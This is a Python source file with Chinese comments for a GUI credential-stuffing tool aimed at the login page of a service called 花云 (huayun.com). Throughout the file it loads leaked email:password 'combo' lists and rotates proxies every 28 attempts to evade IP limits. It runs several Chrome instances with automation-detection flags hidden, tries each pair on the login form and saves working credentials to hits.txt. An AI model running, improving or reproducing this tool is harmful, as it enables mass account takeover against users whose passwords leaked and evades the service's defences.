"""
huayun_login.py - 花云批量登录 GUI 多代理版本
功能：
- CustomTkinter GUI 界面
- 代理存活检测（调用 proxy_checker）
- 自动启动多 Chrome 实例
- 代理轮换逻辑（每28条 combo 换IP）
- combo 自动分割分配给多线程
"""

import os
import sys
import time
import threading
import queue
import math
import json
import tempfile
import shutil
from typing import List, Optional
from dataclasses import dataclass, field

import customtkinter as ctk
from tkinter import filedialog, messagebox
import tkinter as tk

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (
    TimeoutException, NoSuchElementException, WebDriverException
)

from proxy_checker import (
    Proxy, parse_proxy_line, load_proxies_from_file,
    check_proxies_batch, check_proxy
)


# ============================================================
# 配置常量
# ============================================================
HUAYUN_LOGIN_URL = "https://www.huayun.com/login"  # 花云登录页面URL（按实际修改）
COMBO_PER_PROXY = 28  # 每个代理处理的 combo 数量
MAX_THREADS = 5  # 默认最大并发 Chrome 数量
CHECK_TIMEOUT = 10  # 代理检测超时(秒)
LOGIN_TIMEOUT = 30  # 登录页面加载超时(秒)


# ============================================================
# Combo 分割器
# ============================================================
def load_combo_file(filepath: str) -> List[tuple]:
    """加载 combo 文件，返回 [(email, password), ...]"""
    combos = []
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if ":" in line:
                    parts = line.split(":", 1)
                    combos.append((parts[0].strip(), parts[1].strip()))
                elif "\t" in line:
                    parts = line.split("\t", 1)
                    combos.append((parts[0].strip(), parts[1].strip()))
    except FileNotFoundError:
        pass
    except Exception:
        pass
    return combos


def split_combos(combos: List[tuple], chunk_size: int = COMBO_PER_PROXY) -> List[List[tuple]]:
    """将 combo 按 chunk_size 分割"""
    chunks = []
    for i in range(0, len(combos), chunk_size):
        chunks.append(combos[i:i + chunk_size])
    return chunks


# ============================================================
# Chrome 浏览器管理
# ============================================================
class ChromeWorker:
    """单个 Chrome 工作线程管理"""

    def __init__(self, worker_id: int, proxy: Optional[Proxy] = None):
        self.worker_id = worker_id
        self.proxy = proxy
        self.driver = None
        self.profile_dir = None

    def start_browser(self) -> bool:
        """启动带代理的 Chrome"""
        try:
            options = Options()

            # 创建独立的用户数据目录
            self.profile_dir = tempfile.mkdtemp(prefix=f"huayun_chrome_{self.worker_id}_")

            options.add_argument(f"--user-data-dir={self.profile_dir}")
            options.add_argument("--no-first-run")
            options.add_argument("--no-default-browser-check")
            options.add_argument("--disable-blink-features=AutomationControlled")
            options.add_argument("--disable-infobars")
            options.add_argument("--disable-extensions")
            options.add_argument("--disable-gpu")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--no-sandbox")
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option("useAutomationExtension", False)

            # 设置代理
            if self.proxy:
                proxy_arg = self.proxy.to_selenium_arg()
                options.add_argument(f"--proxy-server={proxy_arg}")

            self.driver = webdriver.Chrome(options=options)
            self.driver.set_page_load_timeout(LOGIN_TIMEOUT)
            return True
        except Exception as e:
            print(f"[Worker-{self.worker_id}] Chrome 启动失败: {e}")
            return False

    def login(self, email: str, password: str) -> dict:
        """
        执行单次登录尝试
        返回: {"email": ..., "password": ..., "status": "success"/"failed"/"error", "msg": ...}
        """
        result = {
            "email": email,
            "password": password,
            "status": "error",
            "msg": ""
        }

        if not self.driver:
            result["msg"] = "浏览器未启动"
            return result

        try:
            self.driver.get(HUAYUN_LOGIN_URL)
            time.sleep(2)

            # 等待登录表单加载 - 根据实际页面调整选择器
            WebDriverWait(self.driver, LOGIN_TIMEOUT).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='text'], input[name='email'], input[name='username'], #email, #username"))
            )

            # 查找用户名/邮箱输入框
            email_input = None
            for selector in ["input[name='email']", "input[name='username']", "#email", "#username", "input[type='text']"]:
                try:
                    email_input = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if email_input:
                        break
                except NoSuchElementException:
                    continue

            # 查找密码输入框
            pass_input = None
            for selector in ["input[name='password']", "#password", "input[type='password']"]:
                try:
                    pass_input = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if pass_input:
                        break
                except NoSuchElementException:
                    continue

            if not email_input or not pass_input:
                result["msg"] = "找不到登录表单"
                result["status"] = "error"
                return result

            # 清空并输入
            email_input.clear()
            email_input.send_keys(email)
            time.sleep(0.3)

            pass_input.clear()
            pass_input.send_keys(password)
            time.sleep(0.3)

            # 查找并点击登录按钮
            login_btn = None
            for selector in [
                "button[type='submit']",
                "input[type='submit']",
                "button:contains('登录')",
                ".login-btn",
                "#login-btn",
                "button.btn-primary"
            ]:
                try:
                    login_btn = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if login_btn:
                        break
                except NoSuchElementException:
                    continue

            if not login_btn:
                # 尝试 XPath
                try:
                    login_btn = self.driver.find_element(
                        By.XPATH, "//button[contains(text(),'登录') or contains(text(),'Login')]"
                    )
                except NoSuchElementException:
                    pass

            if login_btn:
                login_btn.click()
            else:
                result["msg"] = "找不到登录按钮"
                result["status"] = "error"
                return result

            time.sleep(3)

            # 判断登录结果 - 根据实际页面调整
            current_url = self.driver.current_url
            page_source = self.driver.page_source.lower()

            if "dashboard" in current_url or "home" in current_url or "panel" in current_url:
                result["status"] = "success"
                result["msg"] = "登录成功"
            elif "密码错误" in page_source or "password" in page_source and "error" in page_source:
                result["status"] = "failed"
                result["msg"] = "密码错误"
            elif "账号不存在" in page_source or "not found" in page_source:
                result["status"] = "failed"
                result["msg"] = "账号不存在"
            elif "login" in current_url:
                result["status"] = "failed"
                result["msg"] = "登录失败(仍在登录页)"
            else:
                result["status"] = "success"
                result["msg"] = "可能成功(URL变化)"

            return result

        except TimeoutException:
            result["msg"] = "页面加载超时"
            result["status"] = "error"
            return result
        except WebDriverException as e:
            result["msg"] = f"浏览器异常: {str(e)[:50]}"
            result["status"] = "error"
            return result
        except Exception as e:
            result["msg"] = f"未知错误: {str(e)[:50]}"
            result["status"] = "error"
            return result

    def close(self):
        """关闭浏览器并清理"""
        try:
            if self.driver:
                self.driver.quit()
                self.driver = None
        except Exception:
            pass
        try:
            if self.profile_dir and os.path.exists(self.profile_dir):
                shutil.rmtree(self.profile_dir, ignore_errors=True)
        except Exception:
            pass



# ============================================================
# 任务调度引擎
# ============================================================
class TaskEngine:
    """多线程任务调度，管理代理轮换和 combo 分配"""

    def __init__(self, proxies: List[Proxy], combos: List[tuple],
                 max_threads: int = MAX_THREADS,
                 combo_per_proxy: int = COMBO_PER_PROXY,
                 log_callback=None,
                 progress_callback=None,
                 result_callback=None):
        self.proxies = proxies
        self.combos = combos
        self.max_threads = max_threads
        self.combo_per_proxy = combo_per_proxy
        self.log_callback = log_callback
        self.progress_callback = progress_callback
        self.result_callback = result_callback

        self.running = False
        self.paused = False
        self.lock = threading.Lock()
        self.threads: List[threading.Thread] = []

        # 统计
        self.total = len(combos)
        self.processed = 0
        self.success_count = 0
        self.failed_count = 0
        self.error_count = 0

        # 结果存储
        self.results_success = []
        self.results_failed = []

    def log(self, msg: str):
        if self.log_callback:
            self.log_callback(msg)
        else:
            print(msg)

    def start(self):
        """启动任务"""
        self.running = True
        self.paused = False

        # 分割 combo 为多个 chunk
        chunks = split_combos(self.combos, self.combo_per_proxy)
        self.log(f"[引擎] 总计 {self.total} 条 combo, 分为 {len(chunks)} 组 (每组 {self.combo_per_proxy} 条)")
        self.log(f"[引擎] 可用代理: {len(self.proxies)} 个, 并发线程: {self.max_threads}")

        # 创建任务队列
        task_queue = queue.Queue()
        for i, chunk in enumerate(chunks):
            proxy_idx = i % len(self.proxies) if self.proxies else 0
            proxy = self.proxies[proxy_idx] if self.proxies else None
            task_queue.put((chunk, proxy, i))

        # 启动工作线程
        for tid in range(min(self.max_threads, task_queue.qsize())):
            t = threading.Thread(
                target=self._worker_thread,
                args=(tid, task_queue),
                daemon=True
            )
            self.threads.append(t)
            t.start()

        # 启动监控线程
        monitor = threading.Thread(target=self._monitor_thread, daemon=True)
        monitor.start()

    def stop(self):
        """停止任务"""
        self.running = False
        self.log("[引擎] 正在停止...")

    def pause(self):
        """暂停/恢复"""
        self.paused = not self.paused
        state = "暂停" if self.paused else "恢复"
        self.log(f"[引擎] 任务已{state}")

    def _worker_thread(self, tid: int, task_queue: queue.Queue):
        """工作线程：从队列取任务执行"""
        while self.running:
            try:
                chunk, proxy, chunk_idx = task_queue.get_nowait()
            except queue.Empty:
                break

            proxy_info = proxy.to_url() if proxy else "无代理(直连)"
            self.log(f"[线程-{tid}] 开始处理第 {chunk_idx + 1} 组 ({len(chunk)}条), 代理: {proxy_info}")

            # 启动浏览器
            worker = ChromeWorker(worker_id=tid, proxy=proxy)
            if not worker.start_browser():
                self.log(f"[线程-{tid}] Chrome 启动失败, 跳过本组")
                with self.lock:
                    self.error_count += len(chunk)
                    self.processed += len(chunk)
                self._update_progress()
                continue

            # 逐条登录
            for email, password in chunk:
                if not self.running:
                    break

                while self.paused and self.running:
                    time.sleep(0.5)

                result = worker.login(email, password)

                with self.lock:
                    self.processed += 1
                    if result["status"] == "success":
                        self.success_count += 1
                        self.results_success.append(result)
                        self.log(f"  ✓ [{self.processed}/{self.total}] {email} -> 成功")
                    elif result["status"] == "failed":
                        self.failed_count += 1
                        self.results_failed.append(result)
                        self.log(f"  ✗ [{self.processed}/{self.total}] {email} -> {result['msg']}")
                    else:
                        self.error_count += 1
                        self.log(f"  ! [{self.processed}/{self.total}] {email} -> {result['msg']}")

                if self.result_callback:
                    self.result_callback(result)
                self._update_progress()

                time.sleep(1)  # 防止请求过快

            # 关闭浏览器
            worker.close()
            self.log(f"[线程-{tid}] 第 {chunk_idx + 1} 组完成, Chrome 已关闭")

        self.log(f"[线程-{tid}] 工作线程结束")

    def _monitor_thread(self):
        """监控线程：等待所有工作线程完成"""
        for t in self.threads:
            t.join()

        self.running = False
        self.log(f"\n[引擎] ========== 全部完成 ==========")
        self.log(f"[引擎] 总计: {self.total} | 成功: {self.success_count} | 失败: {self.failed_count} | 错误: {self.error_count}")

        # 保存结果
        self._save_results()

    def _update_progress(self):
        if self.progress_callback:
            self.progress_callback(self.processed, self.total)

    def _save_results(self):
        """保存成功和失败结果到文件"""
        try:
            if self.results_success:
                with open("hits.txt", "w", encoding="utf-8") as f:
                    for r in self.results_success:
                        f.write(f"{r['email']}:{r['password']}\n")
                self.log(f"[引擎] 成功结果已保存到 hits.txt ({len(self.results_success)} 条)")
        except Exception as e:
            self.log(f"[引擎] 保存结果失败: {e}")



# ============================================================
# GUI 界面 (CustomTkinter)
# ============================================================
class HuaYunLoginApp(ctk.CTk):
    """花云批量登录 GUI 主窗口"""

    def __init__(self):
        super().__init__()

        self.title("花云批量登录 - 多代理版 v1.0")
        self.geometry("1000x700")
        self.minsize(900, 600)

        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")

        # 数据
        self.proxies: List[Proxy] = []
        self.alive_proxies: List[Proxy] = []
        self.combos: List[tuple] = []
        self.engine: Optional[TaskEngine] = None

        self._build_ui()

    def _build_ui(self):
        """构建界面"""
        # ===== 顶部控制面板 =====
        top_frame = ctk.CTkFrame(self)
        top_frame.pack(fill="x", padx=10, pady=(10, 5))

        # 第一行：文件选择
        row1 = ctk.CTkFrame(top_frame, fg_color="transparent")
        row1.pack(fill="x", padx=10, pady=5)

        ctk.CTkLabel(row1, text="代理文件:").pack(side="left", padx=(0, 5))
        self.proxy_path_var = ctk.StringVar(value="proxies.txt")
        ctk.CTkEntry(row1, textvariable=self.proxy_path_var, width=250).pack(side="left", padx=(0, 5))
        ctk.CTkButton(row1, text="浏览", width=60, command=self._browse_proxy).pack(side="left", padx=(0, 20))

        ctk.CTkLabel(row1, text="Combo文件:").pack(side="left", padx=(0, 5))
        self.combo_path_var = ctk.StringVar(value="combo_f.txt")
        ctk.CTkEntry(row1, textvariable=self.combo_path_var, width=250).pack(side="left", padx=(0, 5))
        ctk.CTkButton(row1, text="浏览", width=60, command=self._browse_combo).pack(side="left")

        # 第二行：参数设置
        row2 = ctk.CTkFrame(top_frame, fg_color="transparent")
        row2.pack(fill="x", padx=10, pady=5)

        ctk.CTkLabel(row2, text="并发数:").pack(side="left", padx=(0, 5))
        self.threads_var = ctk.StringVar(value="3")
        ctk.CTkEntry(row2, textvariable=self.threads_var, width=50).pack(side="left", padx=(0, 20))

        ctk.CTkLabel(row2, text="每代理Combo数:").pack(side="left", padx=(0, 5))
        self.per_proxy_var = ctk.StringVar(value="28")
        ctk.CTkEntry(row2, textvariable=self.per_proxy_var, width=50).pack(side="left", padx=(0, 20))

        ctk.CTkLabel(row2, text="登录URL:").pack(side="left", padx=(0, 5))
        self.url_var = ctk.StringVar(value=HUAYUN_LOGIN_URL)
        ctk.CTkEntry(row2, textvariable=self.url_var, width=300).pack(side="left")

        # 第三行：操作按钮
        row3 = ctk.CTkFrame(top_frame, fg_color="transparent")
        row3.pack(fill="x", padx=10, pady=5)

        self.btn_check_proxy = ctk.CTkButton(
            row3, text="检测代理", width=100,
            fg_color="#2196F3", command=self._check_proxies
        )
        self.btn_check_proxy.pack(side="left", padx=(0, 10))

        self.btn_start = ctk.CTkButton(
            row3, text="开始登录", width=100,
            fg_color="#4CAF50", command=self._start_task
        )
        self.btn_start.pack(side="left", padx=(0, 10))

        self.btn_pause = ctk.CTkButton(
            row3, text="暂停", width=80,
            fg_color="#FF9800", command=self._pause_task
        )
        self.btn_pause.pack(side="left", padx=(0, 10))

        self.btn_stop = ctk.CTkButton(
            row3, text="停止", width=80,
            fg_color="#F44336", command=self._stop_task
        )
        self.btn_stop.pack(side="left", padx=(0, 10))

        # 状态标签
        self.status_label = ctk.CTkLabel(
            row3, text="就绪", text_color="#00E676", font=("", 13, "bold")
        )
        self.status_label.pack(side="right", padx=10)

        # ===== 中间信息面板 =====
        info_frame = ctk.CTkFrame(self)
        info_frame.pack(fill="x", padx=10, pady=5)

        self.info_proxy = ctk.CTkLabel(info_frame, text="代理: 0/0 存活", font=("", 12))
        self.info_proxy.pack(side="left", padx=15)

        self.info_combo = ctk.CTkLabel(info_frame, text="Combo: 0 条", font=("", 12))
        self.info_combo.pack(side="left", padx=15)

        self.info_progress = ctk.CTkLabel(info_frame, text="进度: 0/0", font=("", 12))
        self.info_progress.pack(side="left", padx=15)

        self.info_success = ctk.CTkLabel(info_frame, text="成功: 0", text_color="#00E676", font=("", 12, "bold"))
        self.info_success.pack(side="left", padx=15)

        self.info_failed = ctk.CTkLabel(info_frame, text="失败: 0", text_color="#F44336", font=("", 12))
        self.info_failed.pack(side="left", padx=15)

        # 进度条
        self.progress_bar = ctk.CTkProgressBar(self, height=8)
        self.progress_bar.pack(fill="x", padx=10, pady=5)
        self.progress_bar.set(0)

        # ===== 日志区域 =====
        log_frame = ctk.CTkFrame(self)
        log_frame.pack(fill="both", expand=True, padx=10, pady=(5, 10))

        self.log_text = ctk.CTkTextbox(log_frame, font=("Consolas", 11), wrap="word")
        self.log_text.pack(fill="both", expand=True, padx=5, pady=5)

    # ===== 文件浏览 =====
    def _browse_proxy(self):
        path = filedialog.askopenfilename(
            title="选择代理文件",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if path:
            self.proxy_path_var.set(path)

    def _browse_combo(self):
        path = filedialog.askopenfilename(
            title="选择Combo文件",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if path:
            self.combo_path_var.set(path)

    # ===== 日志输出 =====
    def _log(self, msg: str):
        """线程安全的日志输出"""
        def _append():
            self.log_text.insert("end", msg + "\n")
            self.log_text.see("end")
        self.after(0, _append)

    # ===== 代理检测 =====
    def _check_proxies(self):
        filepath = self.proxy_path_var.get()
        if not filepath:
            messagebox.showwarning("提示", "请先选择代理文件")
            return

        self.proxies = load_proxies_from_file(filepath)
        if not self.proxies:
            messagebox.showwarning("提示", "代理文件为空或格式错误")
            return

        self._log(f"[代理] 加载 {len(self.proxies)} 个代理，开始检测...")
        self.btn_check_proxy.configure(state="disabled", text="检测中...")
        self.status_label.configure(text="代理检测中...", text_color="#FFEB3B")

        def run_check():
            checked_count = [0]

            def on_check(proxy, idx, total):
                checked_count[0] += 1
                status = "✓" if proxy.alive else "✗"
                self._log(f"  [{checked_count[0]}/{total}] {proxy.to_url()} {status}")

            self.alive_proxies = check_proxies_batch(
                self.proxies, max_workers=20, timeout=CHECK_TIMEOUT, callback=on_check
            )

            def update_ui():
                self.info_proxy.configure(
                    text=f"代理: {len(self.alive_proxies)}/{len(self.proxies)} 存活"
                )
                self.btn_check_proxy.configure(state="normal", text="检测代理")
                self.status_label.configure(text="代理检测完成", text_color="#00E676")
                self._log(f"[代理] 检测完成: {len(self.alive_proxies)}/{len(self.proxies)} 存活")

            self.after(0, update_ui)

        threading.Thread(target=run_check, daemon=True).start()

    # ===== 开始任务 =====
    def _start_task(self):
        # 加载 combo
        combo_path = self.combo_path_var.get()
        self.combos = load_combo_file(combo_path)
        if not self.combos:
            messagebox.showwarning("提示", "Combo文件为空或路径无效")
            return

        # 检查代理
        if not self.alive_proxies:
            if self.proxies:
                answer = messagebox.askyesno("提示", "没有检测过代理存活，是否使用全部代理？")
                if answer:
                    self.alive_proxies = self.proxies
                else:
                    return
            else:
                # 尝试加载
                filepath = self.proxy_path_var.get()
                self.proxies = load_proxies_from_file(filepath)
                if self.proxies:
                    self.alive_proxies = self.proxies
                    self._log("[提示] 未检测代理，使用全部代理")
                else:
                    messagebox.showwarning("提示", "没有可用代理")
                    return

        # 参数
        try:
            max_threads = int(self.threads_var.get())
        except ValueError:
            max_threads = MAX_THREADS

        try:
            per_proxy = int(self.per_proxy_var.get())
        except ValueError:
            per_proxy = COMBO_PER_PROXY

        # 更新 URL
        global HUAYUN_LOGIN_URL
        HUAYUN_LOGIN_URL = self.url_var.get()

        self.info_combo.configure(text=f"Combo: {len(self.combos)} 条")
        self._log(f"\n[开始] Combo: {len(self.combos)} 条 | 代理: {len(self.alive_proxies)} 个 | 并发: {max_threads}")

        # 创建引擎
        self.engine = TaskEngine(
            proxies=self.alive_proxies,
            combos=self.combos,
            max_threads=max_threads,
            combo_per_proxy=per_proxy,
            log_callback=self._log,
            progress_callback=self._on_progress,
            result_callback=self._on_result
        )

        self.btn_start.configure(state="disabled")
        self.status_label.configure(text="运行中...", text_color="#00E676")

        # 在线程中启动引擎
        threading.Thread(target=self.engine.start, daemon=True).start()

    def _on_progress(self, current, total):
        """进度更新回调"""
        def update():
            if total > 0:
                self.progress_bar.set(current / total)
            self.info_progress.configure(text=f"进度: {current}/{total}")
        self.after(0, update)

    def _on_result(self, result):
        """结果更新回调"""
        def update():
            if self.engine:
                self.info_success.configure(text=f"成功: {self.engine.success_count}")
                self.info_failed.configure(text=f"失败: {self.engine.failed_count}")
        self.after(0, update)

    # ===== 暂停 =====
    def _pause_task(self):
        if self.engine and self.engine.running:
            self.engine.pause()
            if self.engine.paused:
                self.btn_pause.configure(text="恢复")
                self.status_label.configure(text="已暂停", text_color="#FF9800")
            else:
                self.btn_pause.configure(text="暂停")
                self.status_label.configure(text="运行中...", text_color="#00E676")

    # ===== 停止 =====
    def _stop_task(self):
        if self.engine:
            self.engine.stop()
            self.btn_start.configure(state="normal")
            self.status_label.configure(text="已停止", text_color="#F44336")
            self._log("[停止] 任务已手动停止")


# ============================================================
# 入口
# ============================================================
if __name__ == "__main__":
    app = HuaYunLoginApp()
    app.mainloop()
